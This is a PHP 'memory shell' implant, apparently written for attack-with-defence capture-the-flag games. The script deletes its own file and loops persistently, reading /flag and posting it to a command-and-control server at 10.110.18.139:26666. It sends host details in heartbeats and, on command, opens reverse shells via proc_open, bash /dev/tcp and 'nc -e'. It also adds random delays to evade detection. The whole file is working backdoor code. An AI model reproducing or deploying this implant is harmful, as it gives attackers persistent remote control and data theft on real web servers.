<?php 
// PHP C2 Memory Shell for AWD
ignore_user_abort(true);
set_time_limit(0);
error_reporting(0);

// 删除自身文件
unlink(__FILE__);

// C2配置
$c2_host = '10.110.18.139';
$c2_port = '26666';

// 系统信息
$hostname = gethostname();
$username = get_current_user();
$process_name = 'PHP-Memshell';
$pid = getmypid();

// Flag相关配置
$flag_file = '/flag';
$last_flag = '';
$flag_check_interval = 1;
$heartbeat_interval = 60;

// 确保单一实例
$lockFile = '/tmp/.php-lock';
$fp = fopen($lockFile, 'c');
if (!$fp) {
    exit(1);
}
if (!flock($fp, LOCK_EX | LOCK_NB)) {
    fclose($fp);
    exit(0);
}

$last_flag_check = 0;
$last_heartbeat = 0;
$max_retries = 3;
$retry_delay = 3;

// 日志函数调试用 不用的时候直接注释
function debug_log($message) {
    //file_put_contents('/tmp/.php.pid', date('Y-m-d H:i:s') . " $message\n", FILE_APPEND);
}

if (function_exists('pcntl_signal')) {
    pcntl_signal(SIGTERM, function() {
        debug_log("SIGTERM received");
    });
}

// HTTP请求函数
function http_request($url, $method = 'GET', $data = null, $headers = []) {
    global $max_retries, $retry_delay;
    for ($retry = 0; $retry < $max_retries; $retry++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_USERAGENT, 'PHP-Memshell');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            if ($data) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            }
        }
        if (!empty($headers)) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        if ($response !== false && $http_code == 200) {
            return $response;
        }
        if ($retry < $max_retries - 1) {
            sleep($retry_delay);
        }
    }
    return false;
}

// 提交flag
function submit_flag($flag) {
    global $c2_host, $c2_port;
    $url = "http://$c2_host:$c2_port/api/c2/submit-flag?flag=" . urlencode($flag);
    $result = http_request($url);
    if ($result !== false) {
        debug_log("Flag submitted: $flag");
        return true;
    } else {
        debug_log("Failed to submit flag: $flag");
        return false;
    }
}

// 发送心跳包
function send_heartbeat() {
    global $c2_host, $c2_port, $hostname, $username, $process_name, $pid;
    $url = "http://$c2_host:$c2_port/api/c2/heartbeat";
    $data = json_encode([
        'hostname' => $hostname,
        'username' => $username,
        'pid' => (string)$pid,
        'process_name' => $process_name
    ]);
    $headers = ['Content-Type: application/json'];
    $result = http_request($url, 'POST', $data, $headers);
    if ($result !== false) {
        debug_log("Heartbeat sent, response: $result");
        return intval(trim($result));
    } else {
        debug_log("Failed to send heartbeat");
        return 0;
    }
}

// 获取反弹shell地址
function get_reverse_shell_addr() {
    global $c2_host, $c2_port;
    $url = "http://$c2_host:$c2_port/api/c2/get-rs";
    $result = http_request($url);
    if ($result !== false) {
        debug_log("Got reverse shell addr: $result");
        return trim($result);
    } else {
        debug_log("Failed to get reverse shell addr");
        return '';
    }
}

// 执行反弹shell
function execute_reverse_shell($addr) {
    if (empty($addr)) return;
    $parts = explode('|', $addr);
    if (count($parts) != 2) return;
    $host = trim($parts[0]);
    $port = intval(trim($parts[1]));
    if (empty($host) || $port <= 0) return;
    debug_log("Attempting reverse shell to $host:$port");
    $methods = [
        // 方法1: socket + proc_open (非阻塞)
        function($host, $port) {
            if (function_exists('fsockopen') && function_exists('proc_open')) {
                $sock = @fsockopen($host, $port);
                if ($sock) {
                    $descriptorspec = [
                        0 => $sock,
                        1 => $sock,
                        2 => $sock
                    ];
                    $process = @proc_open('/bin/sh', $descriptorspec, $pipes);
                    if (is_resource($process)) {
                        // 检查一下状态，不要调用 proc_close (避免阻塞)
                        $stat = proc_get_status($process);
                        debug_log("proc_open reverse shell started (PID " . $stat['pid'] . ")");
                    }
                }
            }
        },
        // 方法2: bash 反弹 TCP shell
        function($host, $port) {
            if (function_exists('exec')) {
                @exec("bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1' > /dev/null 2>&1 &");
            }
        },
        // 方法3: nc 反弹 shell
        function($host, $port) {
            if (function_exists('shell_exec')) {
                @shell_exec("nc -e /bin/sh $host $port > /dev/null 2>&1 &");
            }
        }
    ];
    foreach ($methods as $method) {
        try {
            $method($host, $port);
            debug_log("Reverse shell method executed");
        } catch (Exception $e) {
            debug_log("Reverse shell method failed: " . $e->getMessage());
        }
    }
}

// 检查flag变化
function check_flag() {
    global $flag_file, $last_flag;
    if (!file_exists($flag_file)) {
        return false;
    }
    $current_flag = trim(file_get_contents($flag_file));
    if (empty($current_flag)) {
        return false;
    }
    if ($current_flag !== $last_flag) {
        $last_flag = $current_flag;
        debug_log("Flag changed: $current_flag");
        return submit_flag($current_flag);
    }
    return false;
}

// 随机延时函数 (避免检测)
function random_sleep($min = 1, $max = 3) {
    $delay = rand($min, $max);
    sleep($delay);
}

while (true) {
    try {
        $current_time = time();
        if ($current_time - $last_flag_check >= $flag_check_interval) {
            check_flag();
            $last_flag_check = $current_time;
        }
        if ($current_time - $last_heartbeat >= $heartbeat_interval) {
            $need_shell = send_heartbeat();
            $last_heartbeat = $current_time;
            if ($need_shell == 1) {
                $shell_addr = get_reverse_shell_addr();
                if (!empty($shell_addr)) {
                    execute_reverse_shell($shell_addr);
                }
            }
        }
        random_sleep(1, 3);
        if (rand(1, 100) == 1) {
            gc_collect_cycles();
        }
    } catch (Exception $e) {
        debug_log("Error in main loop: " . $e->getMessage());
        sleep(5);
    }
}
?>